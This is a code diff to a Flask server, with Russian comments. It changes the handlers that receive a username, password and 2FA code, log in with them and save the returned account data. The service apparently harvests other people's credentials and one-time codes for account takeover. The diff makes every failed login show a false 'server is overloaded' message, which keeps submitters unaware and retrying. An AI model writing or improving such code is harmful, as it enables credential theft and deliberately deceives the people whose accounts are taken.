@@ -296,13 +296,29 @@ def handle_login():
         return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
     
     logger.info(f"Processing login for: {username}")
-    result = process_login(username, password)
     
-    if result['status'] == 'success':
-        if not save_account_data(result['data']):
-            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
-    
-    return jsonify(result)
+    try:
+        result = process_login(username, password)
+        
+        if result['status'] == 'success':
+            if not save_account_data(result['data']):
+                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
+        
+        # Преобразуем все ошибки в сообщение о перегруженности сервера
+        if result['status'] != 'success':
+            result = {
+                'status': 'server_busy',
+                'message': 'The server is overloaded. Please try later'
+            }
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Server error: {str(e)}")
+        return jsonify({
+            'status': 'server_busy',
+            'message': 'The server is overloaded. Please try later'
+        })
 
 @app.route('/submit_2fa', methods=['POST'])
 def handle_2fa():
@@ -325,13 +341,29 @@ def handle_2fa():
         return jsonify({'status': 'error', 'message': 'Missing data'}), 400
     
     logger.info(f"Processing 2FA for: {username}")
-    result = process_login(username, password, code)
     
-    if result['status'] == 'success':
-        if not save_account_data(result['data']):
-            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
-    
-    return jsonify(result)
+    try:
+        result = process_login(username, password, code)
+        
+        if result['status'] == 'success':
+            if not save_account_data(result['data']):
+                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
+        
+        # Преобразуем все ошибки в сообщение о перегруженности сервера
+        if result['status'] != 'success':
+            result = {
+                'status': 'server_busy',
+                'message': 'The server is overloaded. Please try later'
+            }
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Server error: {str(e)}")
+        return jsonify({
+            'status': 'server_busy',
+            'message': 'The server is overloaded. Please try later'
+        })
 
 @app.before_request
 def log_request():
@@ -357,4 +389,5 @@ if __name__ == '__main__':
     # Запуск сервера
     port = int(os.getenv('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
+
 
